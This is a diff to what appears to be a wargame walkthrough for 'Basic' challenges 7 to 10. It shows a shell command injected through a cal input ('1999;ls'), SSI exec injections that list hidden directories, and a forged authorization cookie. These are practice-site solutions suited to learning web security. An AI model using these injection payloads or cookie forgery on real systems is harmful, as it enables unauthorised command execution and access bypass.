@@ -26,3 +26,51 @@ A pretty basic encryption scheme is being used here. As a start, enter 'aaaaaa' 
 
 ###Basic 7:
 Since the input to the cal command is not sanitized, we can inject our own commands into it by using the ; to end the current command and run another. So if we enter '1999;ls' we are giving the calender with the directory listing appended. The password file will appear in that list, so simply append it to the url and get the password.
+
+###Basic 8:
+The key to this challenge is finding out that the "name" you enter is partially evaluated; enter in:
+```
+<!--
+```
+
+And the result will be:
+```
+&lt;!--
+```
+
+Combined with the knowledge that SSI is needed for the page, we can pull up the doc for SSI's (https://httpd.apache.org/docs/2.4/howto/ssi.html) and try the example there:
+```
+<!--#echo var="DATE_LOCAL" -->
+```
+
+You'll get the helpful message that you are on the right track. Since we are looking for a hidden file, we can leverage the php exec command with ls:
+```
+<!--#exec cmd="ls ../" -->
+```
+
+Opening the saved file, it will reveal our hidden file we are looking for:
+```
+au12ha39vc.php
+```
+
+###Basic 9:
+A very similar idea to last time; only difference is that we need to go up an additional level since we are executing from challenge 8's directory:
+```
+<!--#exec cmd="ls ../../9/" -->
+```
+
+This will reveal our hidden file in /9/:
+```
+p91e283zc3.php
+```
+
+###Basic 10:
+Apparently this challenge is using Javascript to validate us, but there's nothing easy in the source we can identify. Fire up Live HTTP headers (or some network logger), and look for your request. You will see the following interesting line:
+```
+Cookie: level10_authorized=no; PHPSESSID=sfvjacpmd94gr0btvugdcmbr41; ads_bm_last_load_status=BLOCKING
+```
+
+That's a suspicious looking cooking - modifying it to yes will give us the access we need:
+```
+document.cookie = "level10_authorized=yes"
+```
